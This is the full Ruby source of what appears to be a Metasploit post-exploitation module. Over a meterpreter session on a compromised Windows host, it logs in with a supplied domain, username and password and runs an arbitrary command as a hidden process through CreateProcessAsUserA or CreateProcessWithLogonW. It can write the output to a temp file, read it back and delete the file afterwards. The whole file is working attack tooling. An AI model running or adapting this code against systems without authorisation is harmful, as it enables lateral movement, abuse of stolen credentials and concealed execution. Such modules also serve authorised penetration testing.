##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

# Runas that allows quoted arguments, chained commands, commands with arguments, running with domain accounts, 
# and does not require any privileges to run.  Also correctly handles cases where cmdout is set to true, but the 
# command returns no output (original version throws a nasty error).  Original version also does not work unless you
# initiate the module from SYSTEM (even though it claims to be able to run as an administrator).

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post
	include Msf::Post::File
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Managed Run Command As User",
			'Description'          => %q{
				This module will login with the specified username/password and execute the
				supplied command as a hidden process. Output is not returned by default, by setting
				CMDOUT to false output will be redirected to a temp file and read back in to
				display.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision: 14774 $',
			'Platform'             => ['windows'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => ['shellster (based on version by Kx499)']
		))

		register_options(
			[
				OptString.new('DOMAIN', [true, 'Domain login with' ]),
				OptString.new('USER', [true, 'Username to login with' ]),
				OptString.new('PASS', [true, 'Password to use' ]),
				OptString.new('CMD', [true, 'Command to execute' ]),
				OptBool.new('CMDOUT', [false, 'Retrieve command output', true]),
			], self.class)
	end

	def run
		# set some instance vars
		@host_info = session.sys.config.sysinfo

		# Make sure we meet the requirements before running the script, note no need to return
		# unless error
		return 0 if session.type != "meterpreter"

		# check/set vars
		cmdout = datastore["CMDOUT"]
		domain = datastore["DOMAIN"] || nil
		user = datastore["USER"] || nil
		pass = datastore["PASS"] || nil
		cmd = datastore["CMD"] || nil
		rg_adv = session.railgun.advapi32
		
		# set profile paths
		sysdrive = session.fs.file.expand_path("%SYSTEMDRIVE%")
		os = @host_info['OS']
		path = sysdrive + "\\Windows\\Temp\\"
		outpath =  path + "out.txt"

		#set command string based on cmdout vars
		cmdstr = "cmd.exe /s /c \"#{cmd}\""
		cmdstr = "cmd.exe /s /c \"#{cmd}\" > #{outpath}" if cmdout
		# Check privs and execute the correct commands
		# if local admin use createprocesswithlogon, if system logonuser and createprocessasuser
		# execute command and get output with a poor mans pipe

		# this is start info struct for a hidden process last two params are std out and in.
		#for hidden startinfo[12] = 1 = STARTF_USESHOWWINDOW and startinfo[13] = 0 = SW_HIDE
		startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]
		startinfo = startinfo.pack("LLLLLLLLLLLLSSLLLL")
		print_status("Trying to execute: #{cmdstr}")
		if is_system?
			print_status("Executing CreateProcessAsUserA...we are SYSTEM")
			l = rg_adv.LogonUserA(user,domain,pass, "LOGON32_LOGON_INTERACTIVE", "LOGON32_PROVIDER_DEFAULT", 4)
			cs = rg_adv.CreateProcessAsUserA(l["phToken"], nil, cmdstr, nil, nil, false, "CREATE_NEW_CONSOLE", nil, nil, startinfo, 16)
		else
			print_status("Executing CreateProcessWithLogonW.")
			cs = rg_adv.CreateProcessWithLogonW(user, domain, pass,"LOGON_WITH_PROFILE", nil, cmdstr, "CREATE_NEW_CONSOLE",nil,nil,startinfo,32)
		end
			
		# Only process file if the process creation was successful, delete when done, give us info
		# about process
		if cs["return"]
			tmpout = ""
			if cmdout
				sleep(0.5)
				outfile = session.fs.file.new(outpath, "rb")
				
				begin
					until outfile.eof?
						tmpout << outfile.read
					end
					
					rescue EOFError
						tmpout << "\nThe file was empty.\n"
				end
				
				outfile.close
				c = session.sys.process.execute("cmd.exe /c del #{outpath}", nil, {'Hidden' => true})
				c.close
			end

			pi = cs["lpProcessInformation"].unpack("LLLL")
			print_status("Command Run: #{cmdstr}")
			print_status("Process Handle: #{pi[0]}")
			print_status("Thread Handle: #{pi[1]}")
			print_status("Process Id: #{pi[2]}")
			print_status("Thread Id: #{pi[3]}")
			print_line(tmpout)
		else
			print_error("Oops something went wrong. Error Returned by Windows was #{cs["GetLastError"]}")
			return 0
		end
	end
end
